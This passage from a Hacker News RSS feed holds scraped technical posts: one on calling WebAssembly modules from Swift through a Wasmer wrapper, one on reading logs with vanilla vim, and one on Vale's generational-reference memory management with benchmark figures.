            <span>(</span>__<span>)</span><span>\ </span>      <span>)</span><span>\/\</span>
               <span>||</span><span>----w</span> |
                <span>||</span>     <span>||</span>
</code></pre></div></div>
<p>Excellent, we got Wasm cows!</p>

<p>The <code>wasmer</code> tool acts as the runtime for the compiled Wasm program,
quite similar to how you invoke Java programs with <code>java</code>,
Python programs with <code>python</code> and so on.<br>
Actually it is a lot more similar to invoking a Docker container
like <code>docker run -it swift</code>, but we’ll get to that later.</p>

<p>“Very nice” you say, but where is the promised Swift stuff? We ain’t here for
the Rost!</p>

<h2 id="swiftywasmer">SwiftyWasmer</h2>

<p>Wasmer comes with quite a set of APIs to embed Wasmer into tools written in
other programming languages. There is one for Go, one for C/C++, 
one for JavaScript and one for Rust. Bot none for Swift.</p>

<p>Thanks to Swift’s excellent C integration, we used that and produced:
<a href="https://github.com/AlwaysRightInstitute/SwiftyWasmer">SwiftyWasmer</a>.</p>

<p>To work, the 
<a href="https://github.com/apple/swift-package-manager">Swift Package Manager</a>
requires a
<a href="https://en.wikipedia.org/wiki/Pkg-config">pkg-config</a>
file.
<em>Fortunately</em> <code>wasmer config</code> can generate one for you:</p>
<div><div><pre><code><span>$ </span>wasmer config <span>--pkg-config</span> <span>\</span>
  <span>&gt;</span> /usr/local/lib/pkgconfig/wasmer.pc
</code></pre></div></div>

<p><em>Unfortunately</em> the generated file is a
<a href="https://github.com/wasmerio/wasmer/issues/1989">little b0rked</a> in 1.0.0.
Open up the file in your favorite editor:</p>

<div><div><pre><code><span>$ </span>emacs /usr/local/lib/pkgconfig/wasmer.pc
</code></pre></div></div>

<p>And adjust two little things:</p>

<ol>
  <li>remove the <code>/wasmer</code> from the <code>Cflags</code> line, it should then read:<br>
<code>Cflags: -I/Users/helge/.wasmer/include</code></li>
  <li>add <code>-lffi</code> to the <code>Libs</code> line, it should then read:<br>
<code>Libs: -L/Users/helge/.wasmer/lib -lwasmer -lffi</code></li>
</ol>

<p>To link statically, move <code>libwasmer.dylib</code> out of the way:</p>
<div><div><pre><code><span>mv</span> ~/.wasmer/lib/libwasmer.dylib <span>\</span>
   ~/.wasmer/lib/libwasmer.dylib-away
</code></pre></div></div>

<p>Let’s build something similar to the <code>wasmer</code> CLI tool above, but using Swift.
The easiest way to get going it to use 
<a href="https://github.com/mxcl/swift-sh"><code>swift sh</code></a> (<code>brew install swift-sh</code>),
but feel free to setup an Xcode or SPM tool project:</p>
<div><div><pre><code><span>#!/usr/bin/swift sh</span>
<span>import</span> <span>Wasmer</span> <span>// AlwaysRightInstitute/SwiftyWasmer</span>

<span>let</span> <span>path</span>     <span>=</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>CommandLine</span><span>.</span><span>arguments</span><span>[</span><span>1</span><span>])</span>
<span>let</span> <span>module</span>   <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Module</span><span>(</span><span>contentsOf</span><span>:</span> <span>path</span><span>)</span>
<span>let</span> <span>instance</span> <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Instance</span><span>(</span><span>module</span><span>)</span>

<span>_</span> <span>=</span> <span>try</span> <span>instance</span><span>.</span><span>exports</span><span>.</span><span>_start</span><span>()</span>
</code></pre></div></div>
<p>You can put that into <code>mytool.swift</code>, run <code>chmod +x mytool.swift</code> and then
run the tool itself:</p>
<div><div><pre><code><span>$ </span><span>echo</span> <span>"Hello Swift"</span> | <span>\</span>
  ./mytool.swift target/wasm32-wasi/release/cowsay.wasm 
 _____________
&lt; Hello Swift <span>&gt;</span>
 <span>-------------</span>
        <span>\ </span>  ^__^
         <span>\ </span> <span>(</span>oo<span>)</span><span>\_</span>______
            <span>(</span>__<span>)</span><span>\ </span>      <span>)</span><span>\/\</span>
               <span>||</span><span>----w</span> |
                <span>||</span>     <span>||</span>
</code></pre></div></div>

<p>Note: We cannot pass commandline arguments to <code>cowsay</code> for
<a href="https://github.com/wasmerio/wasmer-c-api/issues/16">reasons</a>,
but <code>cowsay</code> reads from <code>stdin</code> as a fallback. 
Which is what the <code>echo</code> pipe does.</p>

<p>The code should be pretty self explanatory. We first build a <code>URL</code> for the
file passed in <code>argument[1]</code>. We then create a <code>WebAssembly.Module</code> for that 
<code>URL</code>:</p>
<div><div><pre><code><span>let</span> <span>module</span> <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Module</span><span>(</span><span>contentsOf</span><span>:</span> <span>path</span><span>)</span>
</code></pre></div></div>
<p>A <code>Module</code> is essentially the compiled Wasm. It can’t be executed on its own,
to do that, a <code>WebAssembly.Instance</code> needs to be setup:</p>
<div><div><pre><code><span>let</span> <span>instance</span> <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Instance</span><span>(</span><span>module</span><span>)</span>
</code></pre></div></div>
<p>The <code>Instance</code> is the execution environment, the Sandbox.
When the <code>Instance</code> is created, you provide the compiled <code>Module</code> and optionally
a set of “imports” you want to make available to the module.
After the <code>Instance</code> is created, the “exports” are available.<br>
This is quite similar to how dynamic libraries work, they have a set of symbols
they “import” and a set of symbols (functions, globals, classes, etc) they
“export”.</p>

<p>The default entry point for “tool like” binaries is the <code>_start</code> function,
again quite similar to the <code>_main</code> used in C/system executables.
This is what we (and the wasmer tool) call to start the Wasm program:</p>
<div><div><pre><code><span>_</span> <span>=</span> <span>try</span> <span>instance</span><span>.</span><span>exports</span><span>.</span><span>_start</span><span>()</span>
</code></pre></div></div>
<p><code>_start</code> neither takes arguments nor returns values. An Error would be thrown
if the module wouldn’t actually export the <code>_start</code> function.
For example because it isn’t a commandline tool, but some other module, like a 
library or plugin.</p>

<p>Excellent, we can run tools compiled for Wasm right from within Swift!
An advantage: those Wasm compilations work on all platforms, similar to how
you can run a Java program on all platforms 
(<a href="https://en.wikipedia.org/wiki/Write_once,_run_anywhere">write once, run anywhere</a>).
But in a little different way.</p>

<h2 id="building-a-small-rust-lib-and-call-it-from-swift">Building a Small Rust Lib and Call it from Swift</h2>

<p>We are now going to dive a little deeper into what 
<a href="https://webassembly.org/">Wasm</a>
is and how it works.
Let’s start by writing a tinsy Rust library which provides a function to
add two numbers.</p>

<p>There is no need to know much about Rust here. What we need to do to setup
a library project is similar to SwiftPM. The Rust package manager is called
<code>cargo</code>:</p>
<div><div><pre><code><span>$ </span>cargo new <span>--lib</span> <span>sum</span> <span># create a new lib called `sum`</span>
<span>$ </span>tree <span>sum
sum</span>
├── Cargo.toml
└── src
    └── lib.rs
</code></pre></div></div>

<p>Add this to the <code>Cargo.toml</code>, to tell Rust that we are creating a library
with a “C” interface:</p>
<div><div><pre><code><span>[lib]</span>
<span>crate-type</span> <span>=</span> <span>["cdylib"]</span>
</code></pre></div></div>

<p>Then replace the contents of the <code>lib.rs</code> file with:</p>
<div><div><pre><code><span>#[no_mangle]</span>
<span>extern</span> <span>"C"</span> <span>fn</span> <span>sum</span><span>(</span><span>a</span><span>:</span> <span>i32</span><span>,</span> <span>b</span><span>:</span> <span>i32</span><span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span>
  <span>let</span> <span>s</span> <span>=</span> <span>a</span> <span>+</span> <span>b</span><span>;</span>
  <span>println!</span><span>(</span><span>"From WASM: Sum is: {:?}"</span><span>,</span> <span>s</span><span>);</span>
  <span>s</span>
<span>}</span>
</code></pre></div></div>
<p>The <code>#[no_mangle]</code> and <code>extern "C"</code> are similar to Swift’s <code>@_cdecl</code>.
All the rest is really similar to Swift 
(almost like Rust stole all the best ideas from it 😉).
We add two integer (32-bit) numbers, print it, and then return the result.</p>

<p>Like with cowsay before, our module can be compiled like this:</p>
<div><div><pre><code><span>$ </span>cargo build <span>--target</span> wasm32-wasi
   Compiling <span>sum </span>v0.1.0 <span>(</span>/tmp/sum<span>)</span>
    Finished dev <span>[</span>unoptimized + debuginfo] target<span>(</span>s<span>)</span> <span>in </span>0.45s
<span>$ </span><span>du</span> <span>-sh</span> target/wasm32-wasi/debug/sum.wasm 
1.7M	target/wasm32-wasi/debug/sum.wasm
</code></pre></div></div>

<p>Note that we didn’t define a <code>_start</code> function,
this time we built a library with a single <code>sum</code> function.</p>

<p>Here is a small Swift tool which can load that module written in Rust and 
invoke the function:</p>
<div><div><pre><code><span>#!/usr/bin/swift sh</span>
<span>import</span> <span>Wasmer</span> <span>// AlwaysRightInstitute/SwiftyWasmer</span>

<span>let</span> <span>path</span>     <span>=</span> <span>URL</span><span>(</span><span>fileURLWithPath</span><span>:</span> <span>CommandLine</span><span>.</span><span>arguments</span><span>[</span><span>1</span><span>])</span>
<span>let</span> <span>module</span>   <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Module</span><span>(</span><span>contentsOf</span><span>:</span> <span>path</span><span>)</span>
<span>let</span> <span>instance</span> <span>=</span> <span>try</span> <span>WebAssembly</span><span>.</span><span>Instance</span><span>(</span><span>module</span><span>)</span>

<span>print</span><span>(</span><span>try</span> <span>instance</span><span>.</span><span>exports</span><span>.</span><span>sum</span><span>(</span><span>.</span><span>i32</span><span>(</span><span>46</span><span>),</span> <span>.</span><span>i32</span><span>(</span><span>2</span><span>)))</span>
</code></pre></div></div>
<p>Calling it:</p>
<div><div><pre><code><span>$</span> <span>./</span><span>mytool</span><span>.</span><span>swift</span> <span>target</span><span>/</span><span>wasm32</span><span>-</span><span>wasi</span><span>/</span><span>debug</span><span>/</span><span>sum</span><span>.</span><span>wasm</span> 
<span>From</span> <span>WASM</span><span>:</span> <span>Sum</span> <span>is</span><span>:</span> <span>48</span>
<span>[</span><span>i32</span><span>(</span><span>48</span><span>)]</span>
</code></pre></div></div>

<p>Note how the Rust module prints the result, and our Swift side also prints
the result(s).</p>

<p><strong>An …</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.alwaysrightinstitute.com//swifty-wasmer/">http://www.alwaysrightinstitute.com//swifty-wasmer/</a></em></p>]]>
            </description>
            <link>http://www.alwaysrightinstitute.com//swifty-wasmer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25720304</guid>
            <pubDate>Sun, 10 Jan 2021 21:46:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effectively read logs using vanilla vim]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25720188">thread link</a>) | @jiannengli
<br/>
January 10, 2021 | https://swordandsignals.com/2021/01/10/vim-read-logs.html | <a href="https://web.archive.org/web/*/https://swordandsignals.com/2021/01/10/vim-read-logs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">

    <div itemprop="articleBody">

      <h2 id="tldr">TL;DR</h2>
<p>Glance over the gifs below for tips.</p>

<h2 id="preface">Preface</h2>
<p>As with the motivation for my <a href="https://swordandsignals.com/2020/12/13/5-lines-in-vimrc.html">previous post</a>, I often need to read logs in remote machines or containers. Rather than trying to copy the files to my local computer, it’s easier to open and browse them directly in the remote shell using vim.</p>

<p>This article showcases some vanilla vim features (i.e. without custom plugins) that I find useful while navigating logs. The goal is to provide you intuition on how the features work, so that you can adopt them in your own workflows. Before proceeding, I recommend that you first set the <a href="https://swordandsignals.com/2020/12/13/5-lines-in-vimrc.html">5 configs</a> mentioned in the previous post.</p>

<p>Below is the example log I’ll be using.  Feel free to save the content to a file and follow along:</p>
<div><div><pre><code>2021-01-02 00:00:01,000 - handlers.py[DEBUG]: start: task 1
2021-01-02 00:00:02,000 - util.py[DEBUG]: Running command ['ip', 'link', 'set', 'dev', 'eth0', 'up'] with allowed return codes [0] (shell=False, capture=True)
2021-01-02 00:00:04,000 - handlers.py[DEBUG]: finish: task 1, took 3 seconds
2021-01-02 00:00:10,000 - handlers.py[DEBUG]: start: task 2
2021-01-02 00:00:20,000 - handlers.py[DEBUG]: start: task 3
2021-01-02 00:00:21,000 - util.py[DEBUG]: Running command ['/var/tmp/cloud-init/cloud-init-dhcp-x4y__t7z/dhclient', '-1', '-v', '-lf', '/var/tmp/cloud-init/cloud-init-dhcp-x4y__t7z/dhcp.leases', '-pf', '/var/tmp/cloud-init/cloud-init-dhcp-x4y__t7z/dhclient.pid', 'eth0', '-sf', '/bin/true'] with allowed return codes [0] (shell=False, capture=True)
2021-01-02 00:00:22,000 - util.py[DEBUG]: Running command ['systemd-detect-virt', '--quiet', '--container'] with allowed return codes [0] (shell=False, capture=True)
2021-01-02 00:00:30,000 - handlers.py[DEBUG]: finish: task 2, took 20 seconds
2021-01-02 00:05:00,000 - handlers.py[DEBUG]: finish: task 3, took 280 seconds
</code></pre></div></div>

<h2 id="1-line-wrap">1. Line wrap</h2>
<p>Sometimes, log lines are longer than the width of your terminal. You can use <code>:set wrap</code> to enable line wrap, <code>:set nowrap</code> to disable it, or <code>:set wrap!</code> to toggle.</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/wrap.mp4"></video>
<figcaption>Use <code>:set wrap!</code> to toggle line wrap</figcaption>
</figure>

<h2 id="2-search">2. Search</h2>
<p>You can search within a file using <code>/</code>. What makes it more interesting though is that search supports regular expression - just make sure to escape special characters.</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/find.mp4"></video>
<figcaption>Search for multiple keywords with regex symbol <code>|</code></figcaption>
</figure>
<p>And having regular expression means you can be increasingly creative. Here’s an example to match numbers with at least 2 digits (references: <a href="http://www.rexegg.com/regex-quickstart.html#classes">character classes</a>, <a href="http://www.rexegg.com/regex-quickstart.html#quantifiers">quantifiers</a>):</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/find2.mp4"></video>
<figcaption>Find tasks that took at least 10 seconds</figcaption>
</figure>

<h2 id="3-filter">3. Filter</h2>
<p>The <a href="https://vim.fandom.com/wiki/Power_of_g">global command</a>, <code>:g</code>, comes very handy when dealing with verbose or repetitive logs. I use it most often to filter out unneeded log lines:</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/filter.mp4"></video>
<figcaption><code>:g//d</code> to delete matching lines, <code>:g!//d</code> to delete non-matching lines</figcaption>
</figure>
<p>Or if you want to do the search and filter in one step, put the query between the slashes, e.g. <code>:g/running command/d</code>.</p>

<p>But be careful to not save! You can run <code>vim -R</code> to start vim in read-only mode. To save the filtered results, copy them into a new buffer:</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/filter2.mp4"></video>
<figcaption>Save the filtered results into a new buffer, and undo the changes in the original file</figcaption>
</figure>
<p>Breakdown of commands in the previous gif:</p>
<ol>
  <li><code>gg</code> to jump to top of the file</li>
  <li><code>V</code> to visually select entire lines</li>
  <li><code>G</code> to jump to bottom of the file while in visual mode, thereby selecting all lines</li>
  <li><code>y</code> to copy the selected text</li>
  <li><code>:tabe</code> to open a new blank buffer</li>
  <li><code>p</code> to paste the copied text</li>
  <li><code>gt</code> to navigate to the next (i.e. first) tab</li>
  <li><code>uu</code> to undo the 2 <code>:g</code> filters</li>
</ol>

<h2 id="4-substitute">4. Substitute</h2>
<p>If a lot of information is logged in a delimited format, you can use vim’s <a href="https://vim.fandom.com/wiki/Search_and_replace">search and replace</a> feature to replace the delimiters with new lines, for ease of reading:</p>
<figure>
<video autoplay="" loop="" muted="" playsinline="" src="https://swordandsignals.com/assets/images/2021-01-10-vim-read-logs/substitute.mp4"></video>
<figcaption><code>:%s//\r/g</code> to replace matched results with new lines</figcaption>
</figure>
<p>Deconstructing the syntax:</p>
<ul>
  <li><code>%</code> means to perform substitute on all lines (instead of only the current line)</li>
  <li>the “search” and “replace” portions are surrounded by slashes (in the gif, we left “search” blank because we already had search results)</li>
  <li><code>\r</code> (carriage return) represents new line in vim</li>
  <li><code>g</code> means to substitute all occurrences in a line (instead of only the first occurrence)</li>
</ul>

<h2 id="discussion">Discussion</h2>

<p>Discuss this post on <a href="https://news.ycombinator.com/item?id=25720188">HN</a>.</p>


    </div>

</article></div>]]>
            </description>
            <link>https://swordandsignals.com/2021/01/10/vim-read-logs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25720188</guid>
            <pubDate>Sun, 10 Jan 2021 21:35:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quick Overview of Julia language [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 139 | Comments 48 (<a href="https://news.ycombinator.com/item?id=25719454">thread link</a>) | @gurjeet
<br/>
January 10, 2021 | http://algorithmsbook.com/files/appendix-g.pdf | <a href="https://web.archive.org/web/*/http://algorithmsbook.com/files/appendix-g.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://algorithmsbook.com/files/appendix-g.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719454</guid>
            <pubDate>Sun, 10 Jan 2021 20:38:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generational references 2.3x faster than reference counting (unoptimized)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25719356">thread link</a>) | @tutfbhuf
<br/>
January 10, 2021 | https://vale.dev/blog/generational-references | <a href="https://web.archive.org/web/*/https://vale.dev/blog/generational-references">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">
    <div>
  

        <div>
          <div>
  

          <div>
            
    
<p>2.3x faster than reference counting, unoptimized!</p>

              <p><span>Jan 5 2021</span> </p>
      
</div>
<section>
<p>
<b>Generational references</b> are a new memory management technique that's easy, deterministic, and <i>very</i> fast.
</p>

</section>
<section>
<p>
This technique is the first ingredient in Vale's final <a href="https://vale.dev/blog/hybrid-generational-memory">hybrid-generational memory</a> design, which is even faster. Our eventual goal is to be as fast as Rust, and perhaps even as fast as C++, while being safer than both. <a href="#note0" data-noteid="0">0</a>
</p>
<p>
This article explains how generational references work, how they compare to reference counting, and what makes it all so fast. <a href="#note1" data-noteid="1">1</a>
</p>

</section>
<section>
<h2 id="built-on-single-ownership">
 Built on Single Ownership</h2>
<p>
Recall that in Vale, an object is freed when its <b>owning reference</b> goes out of scope. An object always has exactly one owning reference pointing to it.
</p>
<p>
We can have as many <b>non-owning</b> references as we want. <a href="#note2" data-noteid="2">2</a>
</p>
<p>
In other languages, when a programmer frees an object and then accidentally dereferences a non-owning reference to it, it can cause memory unsafety and vulnerabilities. <a href="#note3" data-noteid="3">3</a>
</p>
<p>
Our goal is to detect this situation and react to it safely. <a href="#note4" data-noteid="4">4</a>
</p>

</section>
<section>
<h2 id="generational-malloc-and-the-sacred-integer">
 Generational Malloc and the Sacred Integer</h2>
<p>
Generational references use <b>generational malloc</b>, which is like regular malloc, except at the top of every allocation is a <b>generation number</b>, which tracks how many objects have previously been at this memory location.
</p>
<p>
One could also think of it as describing "I am the <b>n</b>th inhabitant of this memory location".
</p>
<p>
Freeing an object will increment its generation number. Nobody else ever modifies it.
</p>

</section>
<section>
<p>
Later on, we use this number to see if a particular object is still alive, explained further below.
</p>

</section>
<section>
<p>
Generational malloc would normally be an adjustment to mimalloc or jemalloc, but we can simulate it with our own <span>genMalloc</span> and <span>genFree</span> functions:
</p>
<ul>
<li>
<span>genFree</span> increments the generation number, and instead of calling <span>free</span> <a href="#note5" data-noteid="5">5</a><a href="#note6" data-noteid="6">6</a>, remembers the allocation in a free-list. There's a free-list for every size class (16b, 24b, 32b, &lt;=48b, &lt;=64b, &lt;=128b, etc).
</li>
<li>
<span>genMalloc</span> pulls from a free-list if possible. If it's empty, it calls <span>malloc</span> and initializes the generation number to 1.
</li>
</ul>
<p>
You can find our experimental implementation in <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a>.
</p>

</section>

      </div>
  
<div>

      <nav>
      <p>Generational References</p>
    


      </nav>
      
    

      <div>
        <div>
    
<div id="note0" data-noteid="0">
<p><span>0</span></p><section>
<p>
See <a href="https://vale.dev/blog/hybrid-generational-memory">HGM</a>'s afterword for a hypothetical comparison with Rust!
</p>

</section>
</div>
<div id="note1" data-noteid="1">
<p><span>1</span></p><section>
<p>
 Vale has three release modes:
</p>
<ul>
<li>
<b>Resilient:</b> Fast and 100% safe.
</li>
<li>
<b>Assist:</b> for development, detects logic problems.
</li>
<li>
<b>Unsafe:</b> turns off all safety.
</li>
</ul>
<p>
Resilient mode uses hybrid-generational memory.
</p>

</section>
</div>
<div id="note2" data-noteid="2">
<p><span>2</span></p><section>
<p>
This distinction is similar to C++'s <span>unique_ptr&lt;T&gt;</span> and <span>T*</span>.
</p>

</section>
</div>
<div id="note3" data-noteid="3">
<p><span>3</span></p><section>
<p>
Rust partially solves this, but forces complexity on the programmer and doesn't solve the <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>. We'd like a solution that's simpler, solves the whole problem, with as little <a href="https://vale.dev/blog/hybrid-generational-memory#afterword-how-might-it-compare-to-rust">run-time overhead as Rust</a>.
</p>

</section>
</div>
<div id="note4" data-noteid="4">
<p><span>4</span></p><section>
<p>
Such as by halting or stack unwinding.
</p>

</section>
</div>
<div id="note5" data-noteid="5">
<p><span>5</span></p><section>
<p>
 Our experimental implementation doesn't release memory back to the OS until exit, but when a page is empty, the final version will release the page back to the operating system and map its virtual memory to a read-only page containing all 0xFF.
</p>

</section>
</div>
<div id="note6" data-noteid="6">
<p><span>6</span></p><section>
<p>
 When an allocation's generation can't be incremented any more, it's not used again (at least until we can re-map the page).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="generational-reference-more-than-just-a-pointer">
 Generational Reference: More than just a pointer!</h2>

</section>
<section>
<p>
Vale's references are <b>generational references</b>. A generational reference has two things:
</p>
<ul>
<li>
A pointer to the object.
</li>
<li>
A "target generation" integer.
</li>
</ul>
<p>
To create a reference to an object, we get its allocation's generation number, and include it in the reference.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="dereferencing">
 Dereferencing</h3>

</section>
<section>
<p>
To dereference a generational reference, we do a "liveness check" to see whether the allocation's generation number <b>still matches</b> our reference's target generation. <a href="#note7" data-noteid="7">7</a>
</p>
<p>
This prevents use-after-free problems, and makes Vale completely memory safe.
</p>

</section>
<section>
<p>
It's as if the reference is saying:
</p>
<p><b>"Hello! I'm looking for the 11th inhabitant of this house, are they still around?"</b>
</p>

</section>
<section>
<p>
and the person who opens the door says:
</p>
<p><b>"No, sorry, I'm the 12th inhabitant of this house, the 11th inhabitant is no more."</b> <a href="#note8" data-noteid="8">8</a>
</p>
<p>
or instead:
</p>
<p><b>"Yes! That is me. Which of my fields would you like to access?"</b>
</p>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note7" data-noteid="7">
<p><span>7</span></p><section>
<p>
 This is similar to the "generational indices" technique from C++ and Rust, but applied to the entire world instead of just a specific vector.
</p>

</section>
</div>
<div id="note8" data-noteid="8">
<p><span>8</span></p><section>
<p>
 This will safely halt the program, unless the user is explicitly checking whether something is alive (such as for a weak reference).

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h2 id="speed">
 Speed</h2>

</section>
<section>
<p>
Generational references are only the first steps towards hybrid-generational memory, but we decided to run some early experiments to see how it compares to existing memory models.
</p>
<p>
For this experiment, we benchmarked <a href="#note9" data-noteid="9">9</a> <a href="#note10" data-noteid="10">10</a> three flavors of Vale:
</p>
<ul>
<li>
<b>Unsafe</b>, with no memory safety, the equivalent of C++ (minus caveats, see below!)
</li>
<li>
<b>RC</b>, where we use naive reference counting for all our objects.
</li>
<li>
<b>GM</b>, which uses generational references.
</li>
</ul>

</section>
<section>
<div>
  <table>
    <thead>
      <tr>
        <th>Mode</th>
        <th>Speed&nbsp;(seconds)</th>
        <th>Overhead Compared to Unsafe (seconds)</th>
        <th>Overhead Compared to Unsafe (%)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <th>Unsafe</th>
        <td>43.82&nbsp;seconds</td>
        <td>n/a</td>
        <td>n/a</td>
      </tr>
      <tr>
        <th>RC</th>
        <td>54.90&nbsp;seconds</td>
        <td>+11.08&nbsp;seconds</td>
        <td>+25.29%</td>
      </tr>
      <tr>
        <th>GM</th>
        <td>48.57&nbsp;seconds</td>
        <td>+4.75&nbsp;seconds</td>
        <td>+10.84%</td>
      </tr>
    </tbody>
  </table>
</div>


</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note9" data-noteid="9">
<p><span>9</span></p><section>
<p>
 We used the <a href="https://github.com/ValeLang/Vale/tree/master/benchmarks/BenchmarkRL/vale">BenchmarkRL</a> terrain generator to gather these numbers, with different values for the <span>--region-override</span> flag: <span>unsafe-fast</span>, <span>naive-rc</span>, and <span>resilient-v3</span> respectively.
</p>

</section>
</div>
<div id="note10" data-noteid="10">
<p><span>10</span></p><section>
<p>
 Here, we benchmarked against other flavors of Vale, to isolate the differences between unsafe, reference-counting, and generational references.
</p>
<p>
Once we implement full hybrid-generational memory, we'll be benchmarking against C++ and Rust, stay tuned!

</p>

</section>
</div>

        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<p>
Generational references have only 10.84% overhead, <b>less than half the cost of reference counting!</b> These are very promising results, and suggest that full hybrid-generational memory could be incredibly fast.
</p>

</section>
<section>
<p>
Try it out! In the Vale release, you can find a benchmark folder with scripts to run the benchmarks. You can find the source code for the various approaches <a href="https://github.com/ValeLang/Vale/tree/master/Midas/src/c-compiler/region">here</a> (feel free to swing by the <a href="https://discord.gg/SNB8yGH">discord server</a> and we can point you to the right files).
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
<b>Note these caveats!</b> To isolate the difference between generational references and the other approaches:
</p>
<ul>
<li>
In all flavors, we only allocate objects on the heap, except for primitives. Future versions will add stack allocations.
</li>
<li>
We used <a href="https://github.com/ValeLang/Vale/blob/master/Midas/src/builtins/genHeap.c">genHeap.c</a> for all versions, though only GM ever touches the generation number, the other versions ignore it. Future versions will integrate generational malloc into jemalloc or mimalloc directly.
</li>
</ul>
<p>
Once we address these limitations, we can get more precise benchmarks against the other approaches.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h2 id="why-is-this-so-fast">
 Why is this so fast?</h2>

</section>
<section>
<p>
Generational references are much easier for the CPU to handle than reference-counted references, because:
</p>
<ul>
<li>
Generational references have no aliasing/dealiasing overhead, just on dereference.
</li>
<li>
Generational references cause less cache misses.
</li>
<li>
Liveness checks' branching is easier to predict than RC decrements' branching.
</li>
</ul>

</section>
<section>
<p>
We explain these two differences more below.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<h3 id="no-aliasing-costs">
 No Aliasing Costs</h3>

</section>
<section>
<p>
Reference counting is costly:
</p>
<ul>
<li>
Whenever we "alias" (make a new reference to an object), we have to dereference the object to increment its counter.
</li>
<li>
Whenever we "dealias" (throw away a reference), we have to:
</li>
<ul>
<li>
Dereference the object to decrement its counter,
</li>
<li>
If the counter is zero, deallocate it.
</li>
</ul>
</ul>
<p>
For example:
</p>

    <div>
      
      <p><span><span>fn <span>launchShip</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>, <span><span><span>armada</span></span> <span>&amp;<span><span>List</span>&lt;<span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>)</span> <span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<br>    <p>  <span><span>armada</span><span>.</span><span>add</span>(<span>ship</span>)</span>;</p><p>  <br>  <br>  <br>  <br>  <br>  <br>}</p></span></span></span></p>
    </div>
  
<p>
As you can see, reference counting incurs a cost whenever we alias or dealias. <b>Generational references don't have that cost.</b> The above snippet would have zero overhead if it used generational references.
</p>

</section>

      </div>
  


    </div>
    <div>
      <div>
  
<section>
<p>
Instead, generational references incur a cost whenever we dereference an object:
</p>

    <div>
      
      <p><span><span>fn <span>getShipName</span><span>(<span><span><span>ships</span></span> <span>&amp;<span><span>Map</span>&lt;<span>int</span>, <span>&amp;<span>Spaceship</span></span>&gt;</span></span></span>, <span><span><span>id</span></span> <span>int</span></span>)</span> <span><span>str</span> </span><span>{<br>  <span><span><span><span>ship</span></span></span> = <span><span>ships</span><span>.</span><span>get</span>(<span>id</span>)</span></span>;<p>  <br>  <br>  <span>ret <span><span>ship</span><span>.</span><span>name</span></span>;</span><br>}</p></span></span></span></p>
    </div>
  

</section>
<section>
<p>
This is cheaper because <b>programs dereference less than they alias and dealias:</b> our sample program had 4.7 million counter adjustments, but only 1.3 million liveness checks. <a href="#note11" data-noteid="11">11</a> <a href="#note12" data-noteid="12">12</a>
</p>

</section>
<section>
<h3 id="more-cache-friendly">
 More Cache Friendly</h3>
<p>
Reference counting is not very "cache friendly". Adding and subtracting integers is basically free on modern CPUs, but the real bottleneck in modern programs is how <i>far</i> those integers are: if it's been recently accessed, it's in the nearby cache, and only takes a few CPU cycles to fetch. Otherwise the CPU will "cache miss" and have to bring it in all the way from RAM, which could take <b>hundreds</b> of cycles. <a href="#note13" data-noteid="13">13</a>
</p>
<p>
In our reference-counted <span>launchShip</span> example, the <span>ship.__ref_count++</span> could take a few cycles if <span>ship</span> is already in the cache, or hundreds of cycles if it's not.
</p>

</section>
<section>
<p>
Generational references are more cache friendly:
</p>
<ul>
<li>
